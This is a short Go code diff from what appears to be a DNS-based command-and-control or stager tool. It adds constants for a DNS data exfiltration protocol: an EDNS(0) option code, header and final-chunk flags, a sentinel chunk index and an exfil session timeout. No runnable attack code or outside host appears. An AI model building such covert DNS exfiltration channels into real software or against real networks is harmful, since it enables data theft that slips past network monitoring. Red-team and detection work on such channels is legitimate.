@@ -10,6 +10,24 @@ const (
 	// Calculation: 512 (UDP) - 125 (headers+question) - 6 (CHUNK| prefix) - 10 (TXT overhead) = ~370 bytes
 	DNSChunkSize = 370
 
+	// ExfilOptionCode is the EDNS(0) option code reserved for exfil metadata frames
+	ExfilOptionCode uint16 = 65001
+
+	// ExfilFlagHeader marks the metadata-only header frame
+	ExfilFlagHeader = 0x01
+
+	// ExfilFlagFinalChunk marks the final data chunk in a transfer
+	ExfilFlagFinalChunk = 0x02
+
+	// ExfilFlagComplete marks the completion frame sent after all chunks
+	ExfilFlagComplete = 0x04
+
+	// ExfilProtocolVersion is the current protocol revision for EDNS metadata frames
+	ExfilProtocolVersion = 1
+
+	// ExfilHeaderChunkIndex is the sentinel chunk index used for metadata-only frames
+	ExfilHeaderChunkIndex uint32 = 0xFFFFFFFF
+
 	// DNSLabelMaxLength is the maximum length for a single DNS label
 	DNSLabelMaxLength = 62
 
@@ -21,6 +39,9 @@ const (
 const (
 	// StagerSessionTimeout is how long stager sessions remain active without activity
 	StagerSessionTimeout = 3 * time.Hour
+
+	// ExfilSessionTimeout is how long exfil sessions remain active without new chunks
+	ExfilSessionTimeout = 15 * time.Minute
 
 	// ExpectedResultTimeout is how long we wait for chunked results before cleanup
 	// This timeout is reset with each chunk received, so long-running multi-hour
